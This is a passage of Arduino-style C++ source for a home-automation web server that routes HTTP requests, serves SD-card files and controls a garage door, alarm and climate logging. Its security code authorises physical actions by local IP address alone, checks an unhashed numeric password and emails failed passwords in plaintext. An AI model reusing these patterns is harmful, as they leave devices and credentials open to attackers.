    //ampersand delimited fields at the end of the html POST request. Refer the call to WebServerStripHTMLFormData() below.
    l_request_str = l_req_line.substring(p_req_line.indexOf('/'));   //trim off the GET, POST or (What if '/' not found!)
    l_request_str = l_request_str.substring(0, l_request_str.indexOf(' ')); //trim the trailing data - e.g. " HTTP/1.1"
  }
  //l_request_str has been initiialised

  //The application main web page can be accessed without a page name (number)
  //Force the /2WG/ page name in any case
  //Map www.2wg.co.nz/ to www.2wg.co.nz/2WG/
  if (l_request_str == "/")
    l_request_str = "/" + G_Website + "/"; // /2WG/ or /GTM/
  else if (l_request_str == String("/" + G_Website))
    l_request_str = "/" + G_Website + "/"; // /2WG/ or /GTM/
  //

  //This block of code forces Catweazle local and remote access to the CWZLREQU logs
  //and keeps it separate from the public HTMLREQU html request logs.
  //It has no access/security implications.
  if ((G_RemoteIPAddress[0] == 192) && (G_RemoteIPAddress[1] == 168))
    G_CWZ_HTML_Req_Flag = true;
  //We don't neeed to record the IP address and use a timer for local IP addresses.
  //They always map into the CWZLREQU log file.
  else if ((l_request_str == "/M") ||
           (l_request_str == "/M/") ||
           (l_request_str == "/" + EPSR(E_MOBILE_330)) ||
           (l_request_str == "/" + EPSR(E_MOBILE_330) + "/")) { //Force googlebot mobile enquiries to normal web page
    G_Mobile_Flag = true; //Force mobile view of dashboard
    l_request_str = "/" + G_Website + "/"; // /2WG/ or /GTM/
  }
  else if (l_request_str == G_CWZ_Startup) {
    l_request_str = "/" + G_Website + "/"; // /2WG/ or /GTM/
    G_CWZ_HTML_Req_Flag = true;
    G_CWZL_IP_Addr_Timer = millis(); //Start a timer
    for (byte l_index = 0; l_index < DC_IPAddressFieldCount; l_index++) //Save the IP address
      G_CWZL_IP_Address[l_index] = G_RemoteIPAddress[l_index];
    //
  }
  //If there is a CWZL timer running we check if this is CWZL's IP address.
  else if (CheckSecondsDelay(G_CWZL_IP_Addr_Timer, C_OneMinute * 10) == false) {
    G_CWZ_HTML_Req_Flag = true; //D
    for (byte l_index = 0; l_index < DC_IPAddressFieldCount; l_index++) {
      if (G_CWZL_IP_Address[l_index] != G_RemoteIPAddress[l_index]) {
        G_CWZ_HTML_Req_Flag = false;
        break;
      }
    }
    //Reset the CWZL timer - it will only time out 10 mins after CWZL's last access.
    if (G_CWZ_HTML_Req_Flag)
      G_CWZL_IP_Addr_Timer = millis();
    //
  }
  //l_request_str has now been reset for ICON requests and the CWZL startup string
  //so we can now insert the modified request into the parameter list.
  HTMLParmInsert(E_REQUEST_236, l_request_str);

  //First resolve SD Card requests
  //Doing this here (early) will impose an SD card I/O delay on every html request
  SPIDeviceSelect(DC_SDCardSSPin);
  boolean l_sd_card_item = SD.exists(&l_request_str[0]);
  if (l_sd_card_item == false) {
    //Check for old style ".DIR" directory names
    int l_posn = l_request_str.indexOf(".DIR");
    if (l_posn != -1) {
      l_request_str = l_request_str.substring(0, l_posn) + "/";
      l_sd_card_item = SD.exists(&l_request_str[0]);
    }
  }
  SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)
  if (l_sd_card_item) {
    if (l_request_str.endsWith("/"))
      l_request_str = l_request_str.substring(0, l_request_str.length() - 1);
    //
    p_file_or_dir = l_request_str; //leading slash - no trailing slash

    SPIDeviceSelect(DC_SDCardSSPin);
    File l_file = SD.open(&p_file_or_dir[0], FILE_READ);
    if (l_file.isDirectory()) {
      p_file_or_dir = p_file_or_dir + "/"; //leading and trailing slash
      p_page_number = G_PageNames[5]; //SD Card Directory Browse
    }
    else if ((p_file_or_dir.indexOf(".TXT") != -1) && //This is a text file
             //(!UserLoggedIn()) &&                     //The user is not logged in
             (p_file_or_dir.indexOf(EPSR(E_ROBOTSdtTXT_250)) == -1)) //But it is not robots.txt
      //Other text files are "displayed" within a file display application web page
      //robots.txt is dumped onto a plain web page page
      p_page_number = G_PageNames[6]; //File Display
    else //All the other files are dumped onto a web page to facilitate search engine access
      p_page_number = G_PageNames[31];
    //
    l_file.close();
    SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)

  } //Was an SD card file or directory

  else { //Must be an alphabetic or numbered page request or /2WG/ etc
    //If there were are ? parameters on the URL request line this is where they need to be extracted
    //At this time this application does not process URL line parameters from GET html requests
    l_request_str.toUpperCase();
    //The following are the only valid alpabetic URLs
    if (l_request_str == "/" + G_Website + "/") //This is a global URL
      p_page_number = G_PageNames[0]; //XXX Dashboard
    else { //Otherwise the URL value (page name) is an integer between 0 and 65535
      if (l_request_str.substring(0, 1) == "/") //TRIM FIRST "/"
        l_request_str = l_request_str.substring(1);
      //
      //discard the trailing slash for filenames
      if (l_request_str.endsWith("/"))
        l_request_str = l_request_str.substring(0, l_request_str.length() - 1);
      //
      //This will return zero if the String does not at least have numbers on the LHS
      p_page_number = l_request_str.toInt();
    }
  } //support file, folder or web page

  CheckRAM();
  Pop(c_proc_num);
} //WebServerRequestEvaluate

//---------------------------------------------------------------------------------------

boolean WebServerRequestResolve(unsigned int &p_page_number, String &p_req_line, const String &p_file_or_dir) {
  //Check web page number is valid
  //Log request analysis details
  //Deal with invalid requests
  const byte c_proc_num = 72;
  Push(c_proc_num);

  //Check the request refers to a valid html page number
  //We have already translated the few valid alphabetic page names to number page numbers
  //Public web pages have fixed web page numbers
  //Local LAN commands have page numbers that change every day and are never disclosed in public html source code
  //However the random LAN commands are available to external users who are logged in
  boolean l_ok = false;
  for (byte l_index = 0; l_index < DC_PageNameCount; l_index++) {
    if (p_page_number == G_PageNames[l_index]) {
      l_ok = true;
      break;
    }
  }

  if ((l_ok) && (CheckLocalWebPage(p_page_number))) {
    //Check the local web page/command is coming from an local IP Address
    //or that the external user is logged in.
    //This is a not 100% fail proof but because our local web page/command
    //URL numbers are continuously changing we should be OK.
    if ((!LocalIP(G_RemoteIPAddress)) && (!UserLoggedIn()))
      l_ok = false;
    //
  }

  //Now process invalid page requests - we assume they are hackers if external
  if (!l_ok) {
    //First deal with LAN errors graciously by returning some options
    //In theory a local IP address could be spoofed from outside but then we
    //would only return the LocalWebPage to a local IP address - so no worries.
    if (LocalIP(G_RemoteIPAddress)) {
      //The local web page will only go to a local IP address only so
      //spoofed IP addresses will never see the local web page only commands.
      LocalWebPage(false); //includes EthernetClientStop()
    }
    else { //External IP address made an invalid request
      ProcessInvalidWebPageRequest();
    } //Internal or external IP

    CheckRAM();
    p_req_line = ""; //release from heap immediately
    p_page_number = 0; //forces skip
    Pop(c_proc_num);
    return false;
  } //Process invalid requests

  //If we get here we have a valid html request and are almost ready to process it.

  CheckRAM();
  Pop(c_proc_num);
  return true;
} //WebServerRequestResolve

//---------------------------------------------------------------------------------------

String WebServerWebPage(unsigned int p_page_number) {
  const byte c_proc_num = 70;
  Push(c_proc_num);
  //Extract the name of the web page from EEPROM to write to the HTML request log.
  String l_web_page = "";
  if      (p_page_number == G_PageNames[0])  l_web_page = EPSR(E_Dashboard_173);
  else if (p_page_number == G_PageNames[1])  l_web_page = EPSR(E_Recent_Climate_174);
  else if (p_page_number == G_PageNames[2])  l_web_page = EPSR(E_Climate_For_Week_175);
#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[3])  l_web_page = EPSR(E_Bathroom_100);
#endif
  else if (p_page_number == G_PageNames[4])  l_web_page = EPSR(E_Security_177);
  else if (p_page_number == G_PageNames[5])  l_web_page = EPSR(E_SD_Card_Display_178);
  else if (p_page_number == G_PageNames[6])  l_web_page = EPSR(E_SD_File_Display_179);
#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[7])  l_web_page = EPSR(E_Garage_Door_Activate_180);
  else if (p_page_number == G_PageNames[8])  l_web_page = EPSR(E_Garage_Door_Operate_181);
#endif
  else if (p_page_number == G_PageNames[9])  l_web_page = EPSR(E_5_Min_Climate_182);
  else if (p_page_number == G_PageNames[10]) l_web_page = EPSR(E_15_Min_Climate_183);
  else if (p_page_number == G_PageNames[11]) l_web_page = EPSR(E_30_Min_Climate_184);
  else if (p_page_number == G_PageNames[12]) l_web_page = EPSR(E_60_Min_Climate_185);
#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[13]) l_web_page = EPSR(E_BslR_Light_Activate_186);
  else if (p_page_number == G_PageNames[14]) l_web_page = EPSR(E_BslR_Fan_Activate_187);
  else if (p_page_number == G_PageNames[15]) l_web_page = EPSR(E_BslR_Heater_Activate_188);
#endif
  else if (p_page_number == G_PageNames[16]) l_web_page = EPSR(E_Enter_Password__82);
  else if (p_page_number == G_PageNames[17]) l_web_page = EPSR(E_Password_Login_190);
  else if (p_page_number == G_PageNames[18]) l_web_page = EPSR(E_Alarm_Activate_191);
  else if (p_page_number == G_PageNames[19]) l_web_page = EPSR(E_Settings_192);
  else if (p_page_number == G_PageNames[20]) l_web_page = EPSR(E_Alarm_Dflt_193);
#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[21]) l_web_page = EPSR(E_Garage_Door_Dflt_194);
#endif
  else if (p_page_number == G_PageNames[22]) l_web_page = EPSR(E_Email_Dflt_195);
  else if (p_page_number == G_PageNames[23]) l_web_page = EPSR(E_Email_Activate_196);
  else if (p_page_number == G_PageNames[24]) l_web_page = EPSR(E_RAM_Usage_197);
  else if (p_page_number == G_PageNames[25]) l_web_page = EPSR(E_Daylight_Saving_92);
  else if (p_page_number == G_PageNames[26]) l_web_page = EPSR(E_Periodic_Ram_Rptg_199);
  else if (p_page_number == G_PageNames[27]) l_web_page = EPSR(E_Alarm_Automation_200);
  else if (p_page_number == G_PageNames[28]) l_web_page = EPSR(E_RAM_Checking_201);
#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[29]) l_web_page = EPSR(E_Local_Garage_Door_Open_202);
#endif
  else if (p_page_number == G_PageNames[30]) l_web_page = EPSR(E_Local_Alarm_Off_203);
  else if (p_page_number == G_PageNames[31]) l_web_page = EPSR(E_Dump_File_To_Browser_204);
  else if (p_page_number == G_PageNames[32]) l_web_page = EPSR(E_Process_IP_Address_312);
  else if (p_page_number == G_PageNames[33]) l_web_page = EPSR(E_Test_Email_205);
#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[34]) l_web_page = EPSR(E_Automated_Heating_210);
  else if (p_page_number == G_PageNames[35]) l_web_page = EPSR(E_Automated_Cooling_211);
  else if (p_page_number == G_PageNames[36]) l_web_page = EPSR(E_HOME_HEATING_212);
  else if (p_page_number == G_PageNames[37]) l_web_page = EPSR(E_Switch_Air_Pump_On_213);
  else if (p_page_number == G_PageNames[38]) l_web_page = EPSR(E_Switch_Air_Pump_Off_214);
#endif
  else if (p_page_number == G_PageNames[39]) l_web_page = EPSR(E_UDP_NTP_Update_216);
  else if (p_page_number == G_PageNames[40]) l_web_page = EPSR(E_Local_Alarm_On_217);
#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[41]) l_web_page = EPSR(E_Local_Garage_Door_Close_218);
#endif
  else if (p_page_number == G_PageNames[42]) l_web_page = EPSR(E_Ethernet_Socket_Status_37);
  else if (p_page_number == G_PageNames[43]) l_web_page = EPSR(E_File_Upload_Form_38);
  else if (p_page_number == G_PageNames[44]) l_web_page = EPSR(E_File_Upload_39);
  else if (p_page_number == G_PageNames[45]) l_web_page = EPSR(E_Failed_HTML_Requests_241);
  else if (p_page_number == G_PageNames[46]) l_web_page = EPSR(E_Memory_Backup_253);
  else if (p_page_number == G_PageNames[47]) l_web_page = EPSR(E_Statistics_254);
  else if (p_page_number == G_PageNames[48]) l_web_page = EPSR(E_WEB_CRAWLERS_297);
  else if (p_page_number == G_PageNames[49]) l_web_page = EPSR(E_ERROR_PAGE_299);
  else l_web_page = "";

  CheckRAM();
  Pop(c_proc_num);
  return l_web_page;
} //WebServerWebPage

//---------------------------------------------------------------------------------------

void WebServerCheckSecurity(unsigned int p_page_number, const String &p_req_line) {
  const byte c_proc_num = 8;
  Push(c_proc_num);

  //Now check the security settings.
  //Any password or cookie received are held in the HTML Parm cache
  //If there is a password then check it
  boolean l_new_pwd_ok = false;
  if ((p_page_number == G_PageNames[17]) &&
      (HTMLParmRead(E_PASSWORD_231) != "")) {
    HTMLParmDelete(E_COOKIE_232); //Any password attempt override a cookie
    l_new_pwd_ok = WebServerCheckPwd();
  }

  if (l_new_pwd_ok) {
    //Now get a new cookie for this valid login
    GetANewCookie(); //We take no action if the cookie set is full and we cannot insert a new cookie

    //We assume that the login is for CWZL (since he has not shared the pwd)
    //Force all the logging into the CWZLREQU logs
    G_CWZ_HTML_Req_Flag = true;
    G_CWZL_IP_Addr_Timer = millis(); //Start a time
    for (byte l_index = 0; l_index < DC_IPAddressFieldCount; l_index++) //Save the IP address
      G_CWZL_IP_Address[l_index] = G_RemoteIPAddress[l_index];
    //
    //We also use a valid login to delete this IP Address from the banned list.
    for (byte l_index = 0; l_index < DC_FailedHTMLRequestListCount; l_index++) {
      boolean l_found = true; //D
      for (byte l_idx = 0; l_idx < DC_IPAddressFieldCount; l_idx++) {
        if (G_FailedHTMLRequestList[l_index].IPAddress[l_idx] != G_CWZL_IP_Address[l_idx]) {
          l_found = false;
          break;
        }
      }
      if (l_found == true) { //All IP address fields the same
        //Delete this IP address from the hacker list
        for (byte l_idx = 0; l_idx < DC_IPAddressFieldCount; l_idx++)
          G_FailedHTMLRequestList[l_index].IPAddress[l_idx] = 0;
        //
        G_FailedHTMLRequestList[l_index].AttemptCount = 0;
        G_FailedHTMLRequestList[l_index].BanType[0] = '\0';
        G_FailedHTMLRequestList[l_index].LastDateTime = 0;
        break;
      } //Remove this address from the banned list
    } //Iterate the hacker lost looking for this IP
  } //Process OK login
  else if (HTMLParmRead(E_COOKIE_232) != "")
    CheckACookie(); //Invalid cookie will be deleted
  //

  CheckRAM();
  Pop(c_proc_num);
} //WebServerCheckSecurity

//---------------------------------------------------------------------------------------

boolean WebServerCheckPwd() {
  const byte c_proc_num = 110;
  Push(c_proc_num);
  //We get here because a password was entered on the Password Login web page
  boolean l_pwd_ok = true; //D
  unsigned long l_password;
  //The password has to be a long integer number
  //Can be up to nine digits long
  l_password = EPSR(E_Login_Password_2).toInt();
  //Remove this line to have simple password checking
  //l_password = PasswordHash(G_RemoteIPAddress, l_password);
  //If the password is not nine digits long the user needs to prefix
  //his password data entry with leading zero to make a 9 digit number
  if (ZeroFill(l_password, 9) != HTMLParmRead(E_PASSWORD_231)) {
    l_pwd_ok = false;

    EmailInitialise(Message(M_Invalid_Password_29));
    //Some more EEPROM candidates
    EmailLine(EPSR(E_Websiteco__256) + G_Website);
    EmailLine(EPSR(E_Requestco__257) + HTMLParmRead(E_REQUEST_236));
    EmailLine(EPSR(E_IP_Addressco__258) + G_EthernetClient.getRemoteIPString());
    EmailLine(EPSR(E_Socket_hsco__259) + String(G_EthernetClient.getSocketNum()));
    EmailLine(EPSR(E_Dest_Portco__260) + String(G_EthernetClient.getDestPort()));
    EmailLine(EPSR(E_PASSWORDco__261) + HTMLParmRead(E_PASSWORD_231));
    EmailDisconnect();

    CheckRAM();
    ProcessHackAttempt(Message(M_Invalid_Password_29), "PWD", St_Other_Hacks); //A hack
  }
  if (l_pwd_ok)
    StatisticCount(St_OK_Logins, false); //don't exclude CWZ
  //
  CheckRAM();
  Pop(c_proc_num);
  return l_pwd_ok;
} //WebServerCheckPwd

//---------------------------------------------------------------------------------------

void WebSrvrLaunchPage5(const String &p_file_or_dir) {
  //Originally G_PageNames[5] was used only to browse directories
  //Now this page number is also used for file delete and file display operations
  //derived from form data from a POST html request.
  //We have already extracted the SD Card List browser form fields to the HTMLParm linked list (if any)
  //Now extract them from the linked list (they may not be there - i.e. blank)

  const byte c_proc_num = 121;
  Push(c_proc_num);
  CheckRAM();

  String l_file_or_dir = p_file_or_dir;
  //Reset l_file_or_dir if we are going to use form fields for a file operation
  if (HTMLParmRead(E_FNAME_240) != "")
    l_file_or_dir = HTMLParmRead(E_FOLDER_235) + HTMLParmRead(E_FNAME_240);
  //

#ifdef HeapDebug
  G_HeapDumpPC = true;
#endif
  if ((HTMLParmRead(E_FILEDELETE_239) != "")  &&
      (UserLoggedIn())) {
    //delete the file if a local LAN user or if user logged in
    String l_msg = "";
    SDFileDeleteSPICSC(l_file_or_dir, l_msg);
    ActivityWrite(l_msg);
    l_msg = ""; //force release
    SDCardListWebPage(HTMLParmRead(E_FOLDER_235));
  }
  else if (HTMLParmRead(E_FNAME_240) != "") {
    if (CheckFileAccessSecurity(l_file_or_dir)) {
      if ((p_file_or_dir.indexOf(EPSR(E_ROBOTSdtTXT_250)) == -1) && //It is not robots.txt
          (!LocalIP(G_RemoteIPAddress)) &&                          //Not a local IP
          (!CheckRecentIPAddress()))                                //Not a recent IP
        //Ban Type RFL are not logged into the hacker list but will appear in the hacklogs (like BINs)
        ProcessHackAttempt(EPSR(E_INVALID_FILE_ACCESS_ATTEMPT_246), "RFL", St_Direct_File_Hacks);
      else {
        ProcessCache(true); //Force clear
        //Switch LED to blue to indicate file download
        SetRGBLEDLightColour(0, 0, 255, false); //Blue
        //display the file if a local LAN user or if user logged in or is one of the public directories
        if ((l_file_or_dir.indexOf(".TXT") != -1) &&    //This is a text file
            //(!UserLoggedIn()) &&            //The user is not logged in
            (p_file_or_dir.indexOf(EPSR(E_ROBOTSdtTXT_250)) == -1)) //But it is not robots.txt
          SDFileDisplayWebPage(l_file_or_dir);
        else
          DumpFileToBrowser(l_file_or_dir);
        //
      }
    }
    else //This scenario is unlikely to occur
      ProcInvalidFileAccessAttempt();
    //
  }
  else { //Filename is blank
    //display the folder using the GET/POST information
    //If the URL comes in with a full filename AND we gor here
    //then then would be a problem trying to display a folder.
    //However full filename URLs are identified and processed by pages [6] & [31]
    ProcessCache(true); //Force clear
    SDCardListWebPage(l_file_or_dir);
  }

#ifdef HeapDebug
  G_HeapDumpPC = false;
#endif
  CheckRAM();
  Pop(c_proc_num);
} //WebSrvrLaunchPage5

//---------------------------------------------------------------------------------------

void WebSrvrLaunchPage44() {
  const byte c_proc_num = 122;
  Push(c_proc_num);
  CheckRAM();

  //Switch LED to blue to indicate file upload
  SetRGBLEDLightColour(0, 0, 255, false); //Blue
  String l_filename;
  unsigned long l_length = 0;
  String l_content_type;
  String l_msg;
  boolean l_result = FileUploadProcess(l_filename, l_content_type, l_length, l_msg);
  ProcessCache(true);
  if (!l_result) {
    l_msg = Message(M_File_Upload_Process_Error_ha_35) + l_msg;
#ifdef UploadDebug
    Serial.println(l_msg);
#endif
    SendHTMLError(EPSR(E_400_Bad_Request_219), l_msg);
  }
  else {
    StatisticCount(St_File_Uploads, false); //don't exclude CWZ
    String l_boundary = HTMLParmRead(E_BOUNDARY_233); //RAW BOUNDARY
#ifdef UploadDebug
    Serial.print(F("File Upload:"));
    Serial.println(l_filename);
    Serial.print(F("Boundary:"));
    Serial.println(l_boundary);
    Serial.print(F("Content Type:"));
    Serial.println(l_content_type);
    Serial.print(F("Data Length:"));
    Serial.println(l_length);
#endif
    l_boundary = "--" + l_boundary + "--"; //EOF BOUNDARY has extra ""--" on the end
    boolean l_upload_result = SaveUploadFileStream(l_filename, l_boundary, l_length);
    //HTMLWrite("- " + l_boundary  + "," + String(l_length));
    if (l_upload_result == false) {
      l_msg = EPSR(E_Upload_timeout_262);
      SendHTMLError(EPSR(E_400_Bad_Request_219), l_msg);
#ifdef UploadDebug
      Serial.println(l_msg);
#endif
    }
    else {
      unsigned long l_data_length = HTMLParmRead(E_LENGTH_234).toInt();
      if (l_data_length != l_length) {
        l_msg = EPSR(E_hy_Data_Length_263) + String(l_length) + " (S/B " + String(l_data_length) + ")";
#ifdef UploadDebug
        Serial.println(l_msg);
#endif
        HTMLWrite(l_msg);
        SDCardListWebPage(l_filename.substring(0, l_filename.lastIndexOf("/") + 1));
      }
      else {
        ActivityWrite(EPSR(E_File_Upload_39) + " OK");
        ActivityWrite(EPSR(E_Filenameco_264) + l_filename);
#ifdef UploadDebug
        Serial.println(F("Data Length OK"));
#endif
        SDCardListWebPage(l_filename.substring(0, l_filename.lastIndexOf("/") + 1));
        //Force connection stop after a file upload
        delay(1000);
        EthernetClientStop(); //Discards the HTMLParmList (not the cache)
      } //Length check
    } //upload timed out or OK
  } //Upload request resolved
  CheckRAM();
  Pop(c_proc_num);
} // WebSrvrLaunchPage44()

//---------------------------------------------------------------------------------------

void WebServerPageLaunch(unsigned int p_page_number, const String &p_file_or_dir) { //Minimise Stack size
  /*
    This page responds to actions initiated via an end-user browser.
    In addition to security controls that determine information displayed on
    web pages and providing links to application actions we also need to
    apply tight security within this procedure to prevent external users
    invoking actions that they should not but they try to in any case because
    they have worked out a URL to perform an action and they simply type it
    into their browser.
    We rely on calls to these procedures to determine the users security status:
    - UserLoggedIn
    - LocalIP
  */
  const byte c_proc_num = 9;
  Push(c_proc_num);

  CheckRAM();

  //unsigned int l_page_number = p_page_number;
  //String l_file_or_dir = p_file_or_dir;
  //It is all over now - we have a valid request, have checked the security situation
  //and can now process the request.

  //Some requests just cause a web page to display
  //Some requests require some action (e.g. open the garage door) AND a web page display
  if (p_page_number == G_PageNames[0]) {
    DashboardWebPage();
  }
  else if (p_page_number == G_PageNames[1]) {
    RecentClimateWebPage();
  }
  else if (p_page_number == G_PageNames[2]) {
    WeekClimateWebPage();
  }
#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[3]) {
    BathroomWebPage();
  }
#endif
  else if (p_page_number == G_PageNames[4]) {
    //Much of the content of the SecurityWebPage has access controls
    SecurityWebPage();
  }
  else if (p_page_number == G_PageNames[5])  //SD Card Web Page
    WebSrvrLaunchPage5(p_file_or_dir);
  else if (p_page_number == G_PageNames[6]) { //File Display
    //This page is only called for TXT files not including the robots.txt file.
    //All other requests to display a file get pushed to page [31] DumpFileToBrowser()
    //if (CheckFileAccessSecurity(l_file_or_dir)) {
    if (CheckFileAccessSecurity(p_file_or_dir)) {
      if ((p_file_or_dir.indexOf(EPSR(E_ROBOTSdtTXT_250)) == -1) && //It is not robots.txt
          (!LocalIP(G_RemoteIPAddress)) &&                          //Not a local IP
          (!CheckRecentIPAddress())) {                                //Not a recent IP
        //Ban Type RFL are not logged into the hacker list but will appear in the hacklogs (like BINs)
        ProcessHackAttempt(EPSR(E_INVALID_FILE_ACCESS_ATTEMPT_246), "RFL", St_Direct_File_Hacks);
      }
      else { //display the file if a local LAN user or if user logged in or is one of the public directories
        ProcessCache(true); //Force clear
        //Switch LED to blue to indicate file download
        SetRGBLEDLightColour(0, 0, 255, false); //Blue
        SDFileDisplayWebPage(p_file_or_dir);
      }
    }
    else
      //log cache has not been cleared
      //Following procedure will switch hack flag
      ProcInvalidFileAccessAttempt();
    //
  }

#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[7]) { //Activate the Garage Door
    if ((UserLoggedIn()) ||
        (LocalIP(G_RemoteIPAddress))) {
      G_GarageDoorActive = !G_GarageDoorActive;
      PremisesAlarmCheck(EPSR(E_Garage_Door_Activated_41)); //If alarm active send email about any garage activity
      if (G_GarageDoorActive) ActivityWrite(EPSR(E_Garage_Door_Activated_41));
      else                    ActivityWrite(EPSR(E_Garage_Door_Deactivated_42));
    }
    SecurityWebPage();
  }
  else if (p_page_number == G_PageNames[8]) { //Operate the Garage
    if ((UserLoggedIn()) ||
        (LocalIP(G_RemoteIPAddress))) {
      GarageDoorOperate(false); //Will do nothing if garage door is not active
      PremisesAlarmCheck(EPSR(E_Garage_Door_Operated_43)); //If alarm active send email about any garage activity
    }
    SecurityWebPage();
  } //redisplay the securitywebpage after operating the door
#endif

  else if (p_page_number == G_PageNames[9]) { //FiveMinPeriods
    if (UserLoggedIn()) { //You must be logged in
      MemoryBackup();
      InitClimateArrays(5, false, true); //Do not clear the week day mix/max history, write activity record
      //LoadRecentMemoryBackupFile();
    }
    RecentClimateWebPage();
  }
  else if (p_page_number == G_PageNames[10]) { //QtrHourPeriods
    if (UserLoggedIn()) { //You must be logged in
      MemoryBackup();
      InitClimateArrays(15, false, true); //Do not clear the week day mix/max history, write activity record
      //LoadRecentMemoryBackupFile();
    }
    RecentClimateWebPage();
  }
  else if (p_page_number == G_PageNames[11]) { //HalfHourPeriods
    if (UserLoggedIn()) { //You must be logged in
      MemoryBackup();
      InitClimateArrays(30, false, true); //Do not clear the week day mix/max history, write activity record
      //LoadRecentMemoryBackupFile();
    }
    RecentClimateWebPage();
  }
  else if (p_page_number == G_PageNames[12]) { //OneHourPeriods
    if (UserLoggedIn()) { //You must be logged in
      MemoryBackup();
      InitClimateArrays(60, false, true); //Do not clear the week day mix/max history, write activity record
      //LoadRecentMemoryBackupFile();
    }
    RecentClimateWebPage();
  }
#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[13]) { //Light
    if ((UserLoggedIn()) ||
        (LocalIP(G_RemoteIPAddress))) {
      ;//Bathroom Light Activate/Deactivate
    }
    BathroomWebPage();
  }
  else if (p_page_number == G_PageNames[14]) { //Fan
    if ((UserLoggedIn()) ||
        (LocalIP(G_RemoteIPAddress))) {
      ;//Bathroom Fan Activate/Deactivate
    }
    BathroomWebPage();
  }
  else if (p_page_number == G_PageNames[15]) { //Heater
    if ((UserLoggedIn()) ||
        (LocalIP(G_RemoteIPAddress))) {
      ;//Bathroom Heater Activate/Deactivate
    }
    BathroomWebPage();
  }
#endif
  else if (p_page_number == G_PageNames[16]) { //Login
    PasswordWebPage();
  }
  else if (p_page_number == G_PageNames[17]) { //INPUTPASSWORD
    //If the user has validly logged in the new cookie will be set
    //and the login option will not appear
    DashboardWebPage();
  }
  else if (p_page_number == G_PageNames[18]) {  // Alarm Activate
    if ((UserLoggedIn()) ||
        (LocalIP(G_RemoteIPAddress))) {
      AlarmActivate(); //Switch Off or On
      SecurityWebPage();
    }
  }
  else if (p_page_number == G_PageNames[19]) {
    //Settings web pages items will be links if the user has logged in
    SettingsWebPage();
  }
  else if (p_page_number == G_PageNames[20]) { // AlarmDefault
    if (UserLoggedIn()) {
      SettingSwitch(EPSR(E_Alarm_Default_124), E_Alarm_Default_3); //Have to be logged in
    }
    SettingsWebPage();
  }
#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[21]) { // GarageDoorDefault
    if (UserLoggedIn()) {
      SettingSwitch(EPSR(E_Garage_Door_Default_90), E_Garage_Door_Default_9); //Have to be logged in
    }
    SettingsWebPage();
  }
#endif
  else if (p_page_number == G_PageNames[22]) { // EmailDefault
    if (UserLoggedIn()) {
      SettingSwitch(EPSR(E_Email_Default_91), E_Email_Default_4);      //Have to be logged in
    }
    SettingsWebPage();
  }
  else if (p_page_number == G_PageNames[23]) { // EmailActivate
    if (UserLoggedIn())
      G_Email_Active = !G_Email_Active;                                //Have to be logged in
    //
    SettingsWebPage();
  }
  else if (p_page_number == G_PageNames[24]) { // SRAMUsage
    SRAMUsageWebPage();
  }
  else if (p_page_number == G_PageNames[25]) { // DaylightSaving
    if (UserLoggedIn()) {
      SettingSwitch(EPSR(E_Daylight_Saving_92), E_Daylight_Saving_5);    //Have to be logged in
      if   (EPSR(E_Daylight_Saving_5) == C_T) SetDaylightSavingTime(true);
      else                                    SetDaylightSavingTime(false);
    }
    SettingsWebPage();
  }
  else if (p_page_number == G_PageNames[26]) { // PeriodicRAMReports
    if (UserLoggedIn()) {
      SettingSwitch(EPSR(E_Periodic_RAM_Reporting_93), E_Periodic_RAM_Reporting_6); //Have to be logged in
      ResetSRAMStatistics();
    }
    SettingsWebPage();
  }
  else if (p_page_number == G_PageNames[27]) { // AlarmAutomation
    if (UserLoggedIn())
      SettingSwitch(EPSR(E_Alarm_Automation_200), E_Alarm_Automation_7); //Have to be logged in
    //
    SettingsWebPage();
  }
  else if (p_page_number == G_PageNames[28]) { // RAMChecking
    if (UserLoggedIn()) {
      SettingSwitch(EPSR(E_RAM_Checking_201), E_RAM_Checking_8); //Have to be logged in
      if (EPSR(E_RAM_Checking_8) == C_T) {
        G_RAM_Checking = true;
        G_RAM_Checking_Start = true;
      }
      else
        G_RAM_Checking = false;
      //
    }
    SettingsWebPage();
  }

#ifdef D_2WGApp
  else if (p_page_number == G_PageNames[29]) { // GARAGEOPEN
    //We have prechecked the local IP address
    //Double check is OK but don't bother with an error response
    if (LocalIP(G_RemoteIPAddress)) { //This URL only valid for a local connection
      if (G_PremisesAlarmActive)  //If alarm on we switch if off
        AlarmActivate(); //Switch Off
      //
      if (digitalRead(DC_GarageClosedPin) == HIGH) {//Door is closed
        if (analogRead(GC_LightPin) < GC_LowLightLevel) {
          //ActivityWrite("Nightlight Three Minutes");
          //Allows internet light signal to timeout - then nightlight will start
          G_LEDNightLightTimer = millis() + (C_OneMinute * 3);

        }
        GarageDoorOperate(true); //Force open - even if the door is inactive
        //If it is dark we also turn the hallway light on for three minutes
      }
      LocalWebPage(true); //includes EthernetClientStop()
    }
  }
#endif

  else if (p_page_number == G_PageNames[30]) { // ALARMOFF
    //We have prechecked the local IP address
    //Double check is OK but don't bother with an error response
    if (LocalIP(G_RemoteIPAddress)) { //This URL only valid for a local connection
      if (G_PremisesAlarmActive)  //If alarm on we can switch off
        AlarmActivate(); //Switch Off (or On)
      //
      LocalWebPage(true); //includes EthernetClientStop()
    }
  }
  else if (p_page_number == G_PageNames[31]) { //Download any file except a .txt file (not including robots.txt)
    //Text files for LAN users and Logged In users also dumped here.
    if (CheckFileAccessSecurity(p_file_or_dir)) {
      if ((p_file_or_dir.indexOf(EPSR(E_ROBOTSdtTXT_250)) == -1) && //It is not robots.txt
          (!LocalIP(G_RemoteIPAddress)) &&                          //Not a local IP
          (!CheckRecentIPAddress())) {                              //Not a recent IP
        //Ban Type RFL are not logged into the hacker list but will appear in the hacklogs (like BINs)
        ProcessHackAttempt(EPSR(E_INVALID_FILE_ACCESS_ATTEMPT_246), "RFL", St_Direct_File_Hacks);
      }
      else { //display the file if a local LAN user or if user logged in or is one of the public directories ??
        ProcessCache(true); //Force clear
